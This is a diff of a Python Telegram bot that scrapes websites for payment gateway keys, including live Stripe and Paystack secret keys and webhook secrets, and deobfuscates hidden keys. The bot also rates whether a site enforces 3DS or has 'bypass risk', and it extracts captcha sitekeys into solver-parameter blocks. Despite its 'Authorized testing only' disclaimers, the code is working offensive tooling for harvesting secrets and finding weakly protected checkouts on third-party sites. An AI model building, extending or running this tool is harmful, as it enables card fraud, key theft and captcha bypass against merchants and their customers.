-            "  countryCode · SDK version · theme config\n\n"
-            "🧩 Deobfuscation layer ပါဝင်သည်\n"
-            "⚠️ _Authorized testing only_",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith("http"): url = "https://" + url
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
-        return
-
-    domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
-        f"⚙️ *Payment Config Extractor*\n🌐 `{escape_md(domain)}`\n\n"
-        "⏳ Scanning JS bundles...",
-        parse_mode='Markdown'
-    )
-
-    progress_q = []
-    async def _prog():
-        while True:
-            await asyncio.sleep(2)
-            if progress_q:
-                t = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"⚙️ *PayConfig — `{escape_md(domain)}`*\n\n{escape_md(t)}",
-                        parse_mode='Markdown'
-                    )
-                except Exception:
-                    pass
-
-    prog = asyncio.create_task(_prog())
-    try:
-        result = await asyncio.to_thread(_payconfig_sync, url, lambda t: progress_q.append(t))
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ `{escape_md(str(e))}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    if result.get("error"):
-        await safe_markdown_reply(msg, f"❌ `{escape_md(result['error'])}`")
-        return
-
-    findings  = result["findings"]
-    page_url  = result["page_url"]
-    js_count  = result["js_count"]
-    deob_count= result["deob_count"]
-
-    if not findings:
-        await safe_markdown_reply(msg,
-            f"⚙️ *PayConfig — `{escape_md(domain)}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"📭 Payment SDK config မတွေ့ပါ\n"
-            f"📦 JS bundles: `{js_count}` | 🧩 Deob: `{deob_count}`\n"
-            f"🌐 `{escape_md(page_url[:80])}`"
-        )
-        return
-
-    lines = [
-        f"⚙️ *Payment SDK Config — `{escape_md(domain)}`*",
-        "━━━━━━━━━━━━━━━━━━━━",
-        f"🌐 `{escape_md(page_url[:70])}`",
-        f"📦 JS: `{js_count}` | 🧩 Deob: `{deob_count}` | 💳 Gateways: `{len(findings)}`\n",
-    ]
-
-    _GW_EMOJI = {
-        "Stripe": "🔵", "PayPal": "🟡", "Braintree": "🟠", "Square": "🟣",
-        "Razorpay": "🔴", "Adyen": "🟢", "Klarna": "🟤", "Mollie": "⚫",
-        "Paddle": "🔵", "Paystack": "🟠",
-    }
-
-    sources_map = result.get("sources", {})
-    for gw, fields in findings.items():
-        emoji = _GW_EMOJI.get(gw, "💳")
-        lines.append(f"*{emoji} {gw}*")
-        for field, vals in fields.items():
-            gw_src_list = sources_map.get(gw, {}).get(field, [])
-            for j, v in enumerate(vals[:3]):
-                src_info = gw_src_list[j] if j < len(gw_src_list) else {}
-                via      = src_info.get("found_via", "")
-                src_url  = src_info.get("source_url", "")
-                lines.append(f"  `{escape_md(field)}`: `{escape_md(str(v)[:70])}`")
-                if via:
-                    lines.append(f"  📂 *Via:* `{escape_md(via)}`")
-                if src_url and src_url != page_url:
-                    _su = src_url[:90].replace("`","'")
-                    lines.append(f"  🔗 `{_su}`")
-        lines.append("")
-
-    lines += [
-        "━━━━━━━━━━━━━━━━━━",
-        "⚠️ _Frontend/public config only — API secrets မပါပါ_",
-        "⚠️ _Authorized testing only_",
-    ]
-
-    report = "\n".join(lines)
-    await safe_markdown_reply(msg, _truncate_safe_md(report))
-
-    import io as _io
-    ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=_io.BytesIO(json.dumps({
-                "domain": domain, "page_url": page_url,
-                "scanned_at": datetime.now().isoformat(),
-                "js_count": js_count, "deob_count": deob_count,
-                "findings": findings,
-            }, indent=2, ensure_ascii=False).encode()),
-            filename=f"payconfig_{safe_d}_{ts}.json",
-            caption=f"⚙️ Payment Config — `{escape_md(domain)}`",
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.warning("payconfig export error: %s", e)
 
 
 # ══════════════════════════════════════════════════
@@ -12846,7 +13050,7 @@ def _verify_3ds_stripe(pk_key: str, combined_js: str = "") -> dict:
 
 
 def _fmt_3ds_result(r3: dict) -> list:
-    """Format _verify_3ds_stripe result into Telegram message lines. (improved)"""
+    """Format _verify_3ds_stripe result into Telegram message lines."""
     lines = []
     lines.append("🔐 *3DS / SCA Verification*")
     lines.append("━━━━━━━━━━━━━━━━━━━━")
@@ -12855,18 +13059,6 @@ def _fmt_3ds_result(r3: dict) -> list:
     api_icon = {"VALID": "✅", "INVALID": "🔴", "TIMEOUT": "⏱️",
                 "ERROR": "❌", "UNKNOWN": "❓"}.get(r3["api_status"], "❓")
     lines.append(f"{api_icon} *Stripe API:* `{r3['api_status']}`")
-
-    # ── Clear enforcement verdict ─────────────────────────────────────────────
-    enforced = r3.get("enforced")
-    conf     = r3.get("confidence", "LOW")
-    if enforced is True:
-        verdict_icon = "✅" if conf == "HIGH" else "🟡"
-        lines.append(f"{verdict_icon} *3DS ENFORCED* (confidence: {conf})")
-    elif enforced is False:
-        lines.append(f"🔴 *3DS NOT ENFORCED* (confidence: {conf})")
-    else:
-        lines.append(f"⚠️ *3DS status: MIXED/UNKNOWN* (confidence: {conf})")
-
     if r3.get("card_3ds") and r3["card_3ds"] != "UNKNOWN":
         lines.append(f"💳 *3DS card support:* `{r3['card_3ds']}`")
 
@@ -13711,56 +13903,25 @@ window.__payHook = {
 
 # Key prefix → (gateway, is_live, risk_note)
 _PAY_KEY_PREFIX_MAP = [
-    # ── Stripe (sk_ always secret — CRITICAL) ────────────────────────────────
-    (r"^sk_live_[A-Za-z0-9]{20,}$",            "Stripe",        True,  "🔴 SECRET live key — full API access"),
-    (r"^sk_test_[A-Za-z0-9]{20,}$",            "Stripe",        False, "🟡 Secret test key — test env only"),
-    (r"^rk_live_[A-Za-z0-9]{20,}$",            "Stripe",        True,  "🔴 Restricted live key — scoped access"),
-    (r"^rk_test_[A-Za-z0-9]{20,}$",            "Stripe",        False, "⚪ Restricted test key"),
-    (r"^whsec_[A-Za-z0-9]{20,}$",              "Stripe",        True,  "🔴 Webhook signing secret"),
-    # ── Stripe publishable (pk_ body ≤26 chars = Stripe, ≥30 = Paystack) ────
-    (r"^pk_live_[A-Za-z0-9]{20,26}$",          "Stripe",        True,  "🟠 Stripe publishable live"),
-    (r"^pk_test_[A-Za-z0-9]{20,26}$",          "Stripe",        False, "⚪ Stripe publishable test"),
-    # ── Paystack (pk_ body ≥30 chars) ────────────────────────────────────────
-    (r"^pk_live_[A-Za-z0-9]{30,}$",            "Paystack",      True,  "🟠 Paystack live public key"),
-    (r"^pk_test_[A-Za-z0-9]{30,}$",            "Paystack",      False, "⚪ Paystack test public key"),
-    (r"^sk_live_[A-Za-z0-9]{30,}$",            "Paystack",      True,  "🔴 Paystack live secret key"),
-    (r"^sk_test_[A-Za-z0-9]{30,}$",            "Paystack",      False, "🟡 Paystack test secret key"),
-    # ── Razorpay ─────────────────────────────────────────────────────────────
-    (r"^rzp_live_[A-Za-z0-9]{14,20}$",         "Razorpay",      True,  "🟠 Razorpay live key"),
-    (r"^rzp_test_[A-Za-z0-9]{14,20}$",         "Razorpay",      False, "⚪ Razorpay test key"),
-    # ── PayPal ───────────────────────────────────────────────────────────────
-    (r"^A[A-Za-z0-9_-]{47,97}$",               "PayPal",        None,  "🟠 PayPal Client ID"),
-    (r"^APA-",                                  "PayPal",        True,  "🟠 PayPal Access Token (live)"),
-    (r"^sandbox",                               "PayPal",        False, "⚪ PayPal sandbox"),
-    (r"^sb-",                                   "PayPal",        False, "⚪ PayPal sandbox"),
-    # ── Braintree ────────────────────────────────────────────────────────────
-    (r"^production_",                           "Braintree",     True,  "🟠 Braintree production token"),
-    (r"^[Tt]est_|^sandbox_",                    "Braintree",     False, "⚪ Braintree sandbox token"),
-    # ── Square ───────────────────────────────────────────────────────────────
-    (r"^sq0atp-[A-Za-z0-9_-]{22,43}$",         "Square",        True,  "🟠 Square access token (live)"),
-    (r"^sq0idp-[A-Za-z0-9_-]{22,43}$",         "Square",        True,  "🟢 Square app ID"),
-    (r"^sandbox-sq",                            "Square",        False, "⚪ Square sandbox"),
-    # ── Checkout.com ─────────────────────────────────────────────────────────
-    (r"^pk_prod_[A-Za-z0-9]{20,80}$",          "Checkout.com",  True,  "🟠 Checkout.com live public key"),
-    (r"^pk_sbox_[A-Za-z0-9]{20,80}$",          "Checkout.com",  False, "⚪ Checkout.com sandbox key"),
-    (r"^test_[A-Za-z0-9_-]{20,}$",             "Checkout.com",  False, "⚪ Checkout.com test key"),
-    (r"^live_[A-Za-z0-9_-]{20,}$",             "Checkout.com",  True,  "🟠 Checkout.com live key"),
-    # ── Flutterwave ──────────────────────────────────────────────────────────
-    (r"^FLWPUBK-[A-Za-z0-9]+-X$",              "Flutterwave",   True,  "🟠 Flutterwave live public key"),
-    (r"^FLWPUBK_TEST-[A-Za-z0-9]+-X$",         "Flutterwave",   False, "⚪ Flutterwave test key"),
-    (r"^FLWSECK-[A-Za-z0-9]+-X$",              "Flutterwave",   True,  "🔴 Flutterwave live secret key"),
-    # ── Midtrans ─────────────────────────────────────────────────────────────
-    (r"^SB-Mid-client-[A-Za-z0-9_-]+$",        "Midtrans",      False, "⚪ Midtrans sandbox client key"),
-    (r"^Mid-client-[A-Za-z0-9_-]+$",           "Midtrans",      True,  "🟠 Midtrans production client key"),
-    # ── Xendit ───────────────────────────────────────────────────────────────
-    (r"^xnd_public_production_",               "Xendit",        True,  "🟠 Xendit production key"),
-    (r"^xnd_public_development_",              "Xendit",        False, "⚪ Xendit development key"),
-    # ── Paddle ───────────────────────────────────────────────────────────────
-    (r"^pdl_live_[A-Za-z0-9_]+$",              "Paddle",        True,  "🟠 Paddle Billing live token"),
-    (r"^pdl_sbox_[A-Za-z0-9_]+$",              "Paddle",        False, "⚪ Paddle Billing sandbox token"),
-    # ── Generic fallback ─────────────────────────────────────────────────────
-    (r"^pk_",                                  "Unknown/Pay",   None,  "❓ Generic publishable key"),
-    (r"^sk_",                                  "Unknown/Pay",   None,  "❓ Generic secret key"),
+    (r"^sk_live_",      "Stripe",       True,  "🔴 SECRET live key — full API access"),
+    (r"^sk_test_",      "Stripe",       False, "🟡 Secret test key"),
+    (r"^pk_live_",      "Stripe",       True,  "🟠 Publishable live key — client-side ok"),
+    (r"^pk_test_",      "Stripe",       False, "⚪ Publishable test key"),
+    (r"^rk_live_",      "Stripe",       True,  "🔴 Restricted live key — scoped access"),
+    (r"^rzp_live_",     "Razorpay",     True,  "🟠 Razorpay live key"),
+    (r"^rzp_test_",     "Razorpay",     False, "⚪ Razorpay test key"),
+    (r"^sandbox",       "PayPal",       False, "⚪ PayPal sandbox"),
+    (r"^live",          "PayPal",       True,  "🟠 PayPal live"),
+    (r"^APA-",          "PayPal",       True,  "🟠 PayPal Access Token (live)"),
+    (r"^sb-",           "PayPal",       False, "⚪ PayPal sandbox"),
+    (r"^[Tt]est_",      "Braintree",    False, "⚪ Braintree sandbox token"),
+    (r"^production_",   "Braintree",    True,  "🟠 Braintree production token"),
+    (r"^sq0[ai]sp",     "Square",       True,  "🟠 Square app id (live)"),
+    (r"^sandbox-sq",    "Square",       False, "⚪ Square sandbox"),
+    (r"^test_",         "Checkout.com", False, "⚪ Checkout.com test key"),
+    (r"^live_",         "Checkout.com", True,  "🟠 Checkout.com live key"),
+    (r"^pk_",           "Stripe/Pay",   None,  "❓ Generic publishable key"),
+    (r"^sk_",           "Stripe/Pay",   None,  "❓ Generic secret key"),
 ]
 
 # Payment method signals in JS source
@@ -13775,49 +13936,16 @@ _PAY_METHOD_SIGNALS = {
     "Crypto":          [r"coinbase", r"web3", r"wallet_address", r"ETH|BTC|USDC"],
 }
 
-# 3DS / SCA enforcement signals (improved accuracy)
+# 3DS / SCA enforcement signals
 _3DS_SIGNALS = {
-    # ── Strong enforcement signals ────────────────────────────────────────────
-    "3DS enforced (PaymentIntent flow)": [
-        r"stripe\.confirmCardPayment",
-        r"stripe\.confirmPayment",
-        r"handleNextAction|handleCardAction",
-    ],
-    "3DS enforced (SetupIntent flow)": [
-        r"confirmCardSetup|confirmSetupIntent",
-        r"stripe\.confirmSetup",
-    ],
-    "3DS return_url configured": [
-        r"confirmCardPayment.*return_url",
-        r"return_url.*https",
-    ],
-    "SCA / requires_action handler": [
-        r"requires_action|requires_source_action",
-        r"payment_intent\.status.*requires_action",
-        r"three_d_secure.*required",
-        r"payment_method_options.*three_d_secure",
-    ],
-    # ── Bypass / weakness signals ─────────────────────────────────────────────
-    "⚠️ 3DS bypass risk": [
-        r"skipThreeDSecure|skip_3ds|disable_3ds|bypassThreeDS",
-        r"stripe\.charge\s*\(",
-        r"confirm.*without.*redirect",
-    ],
-    "⚠️ Legacy token flow (no 3DS)": [
-        r"stripe\.createToken\s*\(",
-    ],
-    "⚠️ Card data client-side (PCI risk)": [
-        r"cardNumber|card_number",
-        r"cvv|cvc\b|security.?code",
-    ],
-    # ── neutral / informational ───────────────────────────────────────────────
-    "ℹ️ Elements (CardElement/PaymentElement)": [
-        r"CardElement|PaymentElement|cardElement",
-        r"stripe\.elements\s*\(",
-    ],
-    "ℹ️ Payment Request Button (Apple/Google Pay)": [
-        r"paymentRequest|ApplePaySession|google.*pay",
-    ],
+    "3DS enforced":       [r"confirmCardPayment", r"handleCardAction", r"payment_intent"],
+    "SCA configured":     [r"payment_method_options.*three_d_secure",
+                           r"three_d_secure.*required", r"sca"],
+    "3DS bypass risk":    [r"charge.*capture", r"confirm.*without.*redirect",
+                           r"skipThreeDSecure|skip_3ds|disable_3ds"],
+    "Card data client-side": [r"cardNumber|card_number|cvv|cvc|expiry",
+                               r"stripe\.createToken\s*\(card\)",
+                               r"Elements.*card\b"],
 }
 
 # PCI risk indicators
@@ -13941,6 +14069,160 @@ def _format_pay_gateway_profile(profile: dict) -> list:
     return lines
 
 
+def _extract_sitekeys_from_data(html: str, all_js: dict, live_result: dict, base_url: str = "") -> list:
+    """
+    Reuse existing scan data (HTML + JS bundles + live network stream) to extract
+    captcha sitekeys — including API response bodies, request URLs, and response headers.
+    Used by /keydump and /paykeys to capture sitekey API responses without extra fetches.
+
+    Returns list of finding dicts: {type, site_key, source, page_url, confidence, action?}
+    """
+    findings  = []
+    seen_keys: set = set()
+
+    # ── 1. Static HTML + JS bundles via existing _extract_captcha_info ────────
+    try:
+        for f in _extract_captcha_info(html, base_url, all_js):
+            sk = f.get("site_key", "")
+            if sk and sk not in seen_keys:
+                seen_keys.add(sk)
+                findings.append(f)
+    except Exception:
+        pass
+
+    # ── 2. Live network: response bodies, request URLs, response headers ──────
+    _SITEKEY_API_PATTERNS = [
+        # JSON field — reCAPTCHA v2/v3/Enterprise
+        ("reCAPTCHA sitekey (API response)",
+         re.compile(r'(?i)["\']siteKey["\']\s*:\s*["\']([6L][A-Za-z0-9_\-]{38})["\']')),
+        # JSON field — hCaptcha
+        ("hCaptcha sitekey (API response)",
+         re.compile(r'(?i)["\']sitekey["\']\s*:\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']')),
+        # JSON field — Cloudflare Turnstile
+        ("Turnstile sitekey (API response)",
+         re.compile(r'(?i)["\']siteKey["\']\s*:\s*["\']([01]x[A-Za-z0-9_\-]{20,60})["\']')),
+        # reCAPTCHA URL param ?k= (anchor/bframe/reload calls)
+        ("reCAPTCHA sitekey (API URL param)",
+         re.compile(r'google\.com/recaptcha/(?:api2|enterprise)/[^\s"\']*[?&]k=([0-9A-Za-z_\-]{20,60})')),
+        # reCAPTCHA render= in script src URL
+        ("reCAPTCHA v3 sitekey (render param)",
+         re.compile(r'recaptcha/(?:api|enterprise)\.js[^\s"\']*[?&]render=([0-9A-Za-z_\-]{20,60})')),
+        # hCaptcha URL param ?sitekey= or ?s=
+        ("hCaptcha sitekey (API URL param)",
+         re.compile(r'hcaptcha\.com/[^\s"\']*[?&](?:sitekey|s)=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})')),
+        # Turnstile URL param
+        ("Turnstile sitekey (API URL param)",
+         re.compile(r'challenges\.cloudflare\.com/[^\s"\']*[?&](?:sitekey|k)=([01]x[A-Za-z0-9_\-]{20,60})')),
+        # FunCaptcha / Arkose Labs public key from API
+        ("FunCaptcha public_key (API response)",
+         re.compile(r'(?i)["\'](?:public_key|data-pkey)["\'\s]*[=:]\s*["\']([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})["\']')),
+        # Response header: x-captcha-key / x-recaptcha-key / x-hcaptcha-key
+        ("Captcha key (response header)",
+         re.compile(r'(?i)x-(?:captcha|recaptcha|hcaptcha)-(?:key|sitekey):\s*([A-Za-z0-9_\-]{20,})')),
+        # Generic sitekey in any JSON body
+        ("Captcha sitekey (JSON generic)",
+         re.compile(r'(?i)["\'](?:site_key|sitekey|captcha_key|captcha_site_key)["\'\s]*:\s*["\']([A-Za-z0-9_\-]{20,80})["\']')),
+    ]
+
+    for req in live_result.get("live_requests", []):
+        req_url  = req.get("url", "") or ""
+        body     = req.get("body", "") or req.get("response_body", "") or ""
+        headers  = req.get("headers", {}) or {}
+
+        # Build header string for header-pattern scanning
+        header_str = "\n".join(f"{k}: {v}" for k, v in headers.items())
+
+        for scan_text, src_label in [
+            (body,       f"API response ← {req_url[:70]}"),
+            (req_url,    f"API request URL: {req_url[:100]}"),
+            (header_str, f"Response header ← {req_url[:60]}"),
+        ]:
+            if not scan_text:
+                continue
+            for ktype, pat in _SITEKEY_API_PATTERNS:
+                for m in pat.finditer(scan_text):
+                    val = m.group(1).strip()
+                    if not val or len(val) < 8 or val in seen_keys:
+                        continue
+                    seen_keys.add(val)
+                    findings.append({
+                        "type":       ktype,
+                        "site_key":   val,
+                        "source":     src_label,
+                        "page_url":   base_url,
+                        "confidence": "CONFIRMED ✅",
+                    })
+
+    return findings
+
+
+def _format_sitekey_section(sitekeys: list, max_items: int = 10) -> list:
+    """
+    Format sitekey findings into Telegram-ready Markdown lines.
+    Includes JSON solver params block for each entry.
+    """
+    if not sitekeys:
+        return []
+
+    _SK_TYPE_ICON = {
+        "reCAPTCHA": "🔵",
+        "hCaptcha":  "🟡",
+        "Turnstile": "🟠",
+        "FunCaptcha":"🔴",
+        "GeeTest":   "🟢",
+        "Captcha":   "🔑",
+    }
+
+    lines = [
+        "",
+        "🔑 *Captcha Sitekeys (API Response Capture)*",
+        "━━━━━━━━━━━━━━━━━━━━",
+    ]
+
+    for i, f in enumerate(sitekeys[:max_items], 1):
+        cap_type = f.get("type", "")
+        sk       = (f.get("site_key") or f.get("value") or "").replace("`", "'")
+        conf     = f.get("confidence", "")
+        src      = f.get("source", "")[:70]
+        action   = f.get("action", "")
+        page     = f.get("page_url", "")
+        enterprise = f.get("enterprise", False)
+        min_score  = f.get("min_score", "")
+
+        icon = next((v for k, v in _SK_TYPE_ICON.items() if k in cap_type), "🔑")
+        lines.append(f"*{icon} [{i}]* {conf} *{escape_md(cap_type)}*")
+        lines.append(f"  🔑 `{sk}`")
+        if action:
+            lines.append(f"  ⚡ action: `{escape_md(action)}`")
+        if enterprise:
+            lines.append(f"  🏢 enterprise")
+        if min_score:
+            lines.append(f"  📊 min\\_score: `{min_score}`")
+        if src:
+            lines.append(f"  📂 _{escape_md(src)}_")
+
+        # ── JSON solver-params block ──────────────────────────────────────
+        sp: dict = {"type": cap_type, "sitekey": sk}
+        if page:
+            sp["pageurl"] = page[:100]
+        if action:
+            sp["action"] = action
+        if enterprise:
+            sp["enterprise"] = 1
+        if min_score:
+            sp["min_score"] = float(min_score) if min_score else None
+
+        import json as _json_sk
+        try:
+            sp_str = _json_sk.dumps(sp, indent=2, ensure_ascii=False)
+        except Exception:
+            sp_str = str(sp)
+        lines.append(f"```\n{sp_str}\n```")
+        lines.append("")
+
+    return lines
+
+
 def _paykeys_sync(url: str, progress_cb=None) -> dict:
     data = _extract_run(url, _PAY_JS_EVAL, progress_cb)
     if data.get("error"):
@@ -13979,67 +14261,8 @@ def _paykeys_sync(url: str, progress_cb=None) -> dict:
             if not _validate_payment_key(t, v):
                 return
             seen.add(d)
-            # ── source_url + found_via extraction ────────────────────
-            source_url = ""
-            found_via  = "static scan"
-            src_lower  = src.lower()
-            if src.startswith("http"):
-                source_url = src
-                found_via  = "JS static"
-            elif "playwright" in src_lower or "dynamic" in src_lower:
-                found_via  = "Playwright dynamic"
-                # Try to pull URL from src string e.g. "Playwright XHR https://..."
-                _m = re.search(r"https?://[^\s]+", src)
-                if _m:
-                    source_url = _m.group(0)[:200]
-            elif "live stream" in src_lower:
-                found_via  = "live stream intercept"
-                _m = re.search(r"https?://[^\s]+", src)
-                if _m:
-                    source_url = _m.group(0)[:200]
-            elif "json response" in src_lower or "api" in src_lower:
-                found_via  = "API response"
-                _m = re.search(r"https?://[^\s]+", src)
-                if _m:
-                    source_url = _m.group(0)[:200]
-            elif "sourcemap" in src_lower or "source map" in src_lower:
-                found_via  = "source map"
-            elif "worker" in src_lower:
-                found_via  = "service worker"
-            elif "subpage" in src_lower or "sub-page" in src_lower:
-                found_via  = "sub-page scan"
-            elif "graphql" in src_lower:
-                found_via  = "GraphQL"
-            elif "iframe" in src_lower:
-                found_via  = "iframe src"
-            elif "window/" in src_lower or "framework" in src_lower:
-                found_via  = "JS globals"
-            elif "html" in src_lower:
-                found_via  = "HTML"
-            # ── disambiguate Stripe vs Paystack for pk_ keys ─────────
-            _type = t
-            if "Stripe Publishable" in t or "Paystack Public" in t:
-                # Stripe pk keys: typically 24 chars after prefix
-                # Paystack pk keys: typically 32+ chars after prefix
-                prefix_end = v.find("_", 3) + 1  # after pk_(live|test)_
-                key_body = v[prefix_end:] if prefix_end > 0 else v[8:]
-                if len(key_body) <= 26:
-                    _type = "Stripe Publishable Key"
-                elif len(key_body) >= 30:
-                    _type = "Paystack Public Key"
-                # context hint from src
-                if "paystack" in src_lower:
-                    _type = "Paystack Public Key"
-                elif "stripe" in src_lower:
-                    _type = "Stripe Publishable Key"
-            entry = {
-                "type":       _type,
-                "value":      v,
-                "source":     src,
-                "source_url": source_url,
-                "found_via":  found_via,
-                "env":        _detect_env(_type, v),
-            }
+            entry = {"type": t, "value": v, "source": src,
+                     "env": _detect_env(t, v)}
             if confidence:
                 entry["confidence"] = confidence
             if verified is not None:
@@ -14060,6 +14283,13 @@ def _paykeys_sync(url: str, progress_cb=None) -> dict:
             for m in pat.finditer(text):
                 val = m.group(1) if m.lastindex else m.group(0)
                 _add(key_type, val.strip(), label)
+        # Deobfuscation pass: decode atob/hex/join/fromCharCode hidden keys
+        _deob = _deobfuscate_text(text)
+        if _deob:
+            for key_type, pat in _PAY_PATTERNS:
+                for m in pat.finditer(_deob):
+                    val = m.group(1) if m.lastindex else m.group(0)
+                    _add(key_type, val.strip(), label + " [deobfuscated]")
 
     # ── 2. Source map texts ──
     for text, label in sourcemap_texts:
@@ -14192,6 +14422,20 @@ def _paykeys_sync(url: str, progress_cb=None) -> dict:
         except Exception as _tds_err:
             logger.debug("3DS verify error: %s", _tds_err)
 
+    # ── Sitekey extraction (Captcha API response capture) ─────────────────────
+    if progress_cb: progress_cb("🔑 Extracting captcha sitekeys from API responses...")
+    try:
+        _pk_html   = data.get("html", "")
+        _pk_all_js = {
+            e["url"]: e.get("response_body", "")
+            for e in data.get("network_log", [])
+            if ".js" in e.get("url", "")
+        }
+        sitekeys = _extract_sitekeys_from_data(_pk_html, _pk_all_js, live_result, url)
+    except Exception as _sk_e:
+        logger.debug("paykeys sitekey extraction error: %s", _sk_e)
+        sitekeys = []
+
     return {
         "error":    None,
         "findings": findings,
@@ -14202,6 +14446,7 @@ def _paykeys_sync(url: str, progress_cb=None) -> dict:
         "live_result": live_result,
         "gateway_profile": gateway_profile,
         "tds_result":     tds_result,
+        "sitekeys":  sitekeys,
         "extra_scans": {
             "sourcemaps": len(sourcemap_texts),
             "service_workers": len(sw_texts),
@@ -14271,7 +14516,7 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     prog = asyncio.create_task(_prog())
     try:
-        result = await asyncio.to_thread(_paykeys_sync, url, lambda t: progress_q.append(t))
+        result = await run_scan(uid, _paykeys_sync, url, lambda t: progress_q.append(t))
     except Exception as e:
         prog.cancel()
         await safe_markdown_reply(msg, f"❌ `{escape_md(str(e))}`")
@@ -14290,6 +14535,7 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reqs         = result.get("requests", 0)
     live_reqs    = len(live_result.get("live_requests", []))
     extra        = result.get("extra_scans", {})
+    sitekeys     = result.get("sitekeys", [])
 
     confirmed   = [f for f in findings if "CONFIRMED"   in f.get("confidence","")]
     high_live   = [f for f in findings if f.get("confidence","").startswith("HIGH")]
@@ -14333,39 +14579,25 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ordered.append((f, badge))
 
     for i, (f, badge) in enumerate(ordered[:50], 1):
-        val      = f.get("value", "")
-        env      = f.get("env", _detect_env(f["type"], val))
-        vfy      = f.get("verified", "")
-        vfy_tag  = " ✔️" if vfy == "VALID" else (" ✖️" if vfy == "INVALID" else "")
-        conf     = f.get("confidence", "")
-        src_tag  = ""
+        val     = f.get("value", "")
+        env     = f.get("env", _detect_env(f["type"], val))
+        vfy     = f.get("verified", "")
+        vfy_tag = " ✔️" if vfy == "VALID" else (" ✖️" if vfy == "INVALID" else "")
+        conf    = f.get("confidence", "")
+        src_tag = ""
         if "SOURCEMAP" in conf: src_tag = " 🗺️"
         elif "SW"      in conf: src_tag = " ⚙️"
         elif "SUBPAGE" in conf: src_tag = " 🔗"
         elif "GRAPHQL" in conf: src_tag = " 📐"
 
-        env_warn  = " ⚠️" if (env == "🔴 LIVE" and "secret" in f.get("type","").lower()) else ""
-        found_via = f.get("found_via", "")
-        src_url   = f.get("source_url", "")
-        src_raw   = f.get("source", "")
+        env_warn = " ⚠️" if (env == "🔴 LIVE" and "secret" in f.get("type","").lower()) else ""
 
-        # ── score badge ──
-        _, _, sc = _kd_confidence(f.get("type",""), val)
-        score_tag = f" `score:{sc}`"
-
-        lines.append(f"*[{i}]* {badge} {env}{vfy_tag}{src_tag}{env_warn}{score_tag}")
+        lines.append(f"*[{i}]* {badge} {env}{vfy_tag}{src_tag}{env_warn}")
         lines.append(f"  📌 `{escape_md(f['type'])}`")
         _val_safe = val[:80].replace("`", "'")
         lines.append(f"  🔑 `{_val_safe}`")
-
-        # Source tracing: found_via > source_url > raw source
-        if found_via:
-            lines.append(f"  📂 *Via:* `{escape_md(found_via)}`")
-        if src_url and len(src_url) > 8:
-            _su = src_url[:90].replace("`","'")
-            lines.append(f"  🔗 `{_su}`")
-        elif src_raw and not found_via:
-            lines.append(f"  📂 _{escape_md(src_raw[:60])}_")
+        _src_safe = f.get('source', '')[:60]
+        lines.append(f"  📂 _{escape_md(_src_safe)}_")
         lines.append("")
 
     lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
@@ -14381,9 +14613,25 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lines.append("")
         lines += _fmt_3ds_result(tds_result)
 
+    # ── Sitekey section (Captcha API response capture) ───────────────────────
+    if sitekeys:
+        lines += _format_sitekey_section(sitekeys)
+
     report = "\n".join(lines)
 
     await safe_markdown_reply(msg, _truncate_safe_md(report))
+
+    # ── Sitekey found but no payment keys — send sitekey-only message ────────
+    if sitekeys and not findings:
+        sk_only_lines = [
+            f"💳 *Payment Key Extractor v19 — `{escape_md(domain)}`*",
+            "━━━━━━━━━━━━━━━━━━━━",
+            f"🌐 `{escape_md(page_url)}`",
+            f"📡 Static: `{reqs}` | Live: `{live_reqs}`",
+            "📭 Payment keys မတွေ့ပါ",
+        ] + _format_sitekey_section(sitekeys)
+        await safe_markdown_reply(msg, _truncate_safe_md("\n".join(sk_only_lines)))
+        return
 
     # ── Cache verifiable keys for inline button ────────────────────────────
     _verifiable_types = {
@@ -14416,6 +14664,7 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "scanned_at":             datetime.now().isoformat(),
                 "bot_version":            "v19",
                 "findings":               findings,
+                "sitekeys":               sitekeys,
                 "live_requests_captured": live_reqs,
                 "sse_frames_captured":    len(live_result.get("sse_frames",[])),
                 "confirmed":              len(confirmed),
@@ -14426,7 +14675,8 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
             filename=f"paykeys_{safe_d}_{ts}.json",
             caption=(
                 f"💳 Payment Keys v19 — `{escape_md(domain)}`\n"
-                f"✅ Confirmed: `{len(confirmed)}` | 🔴 Live: `{len(live_keys)}` | Total: `{len(findings)}`"
+                f"✅ Confirmed: `{len(confirmed)}` | 🔴 Live: `{len(live_keys)}` | Total: `{len(findings)}`\n"
+                f"🔑 Sitekeys: `{len(sitekeys)}`"
             ),
             parse_mode='Markdown'
         )
@@ -14448,34 +14698,6 @@ async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-    # ── Deobfuscation layer — fetched JS ထဲ obfuscated keys ရှာ ─────────────
-    try:
-        texts_for_deob = {}
-        for item in result.get("requests_log", result.get("network_log", [])):
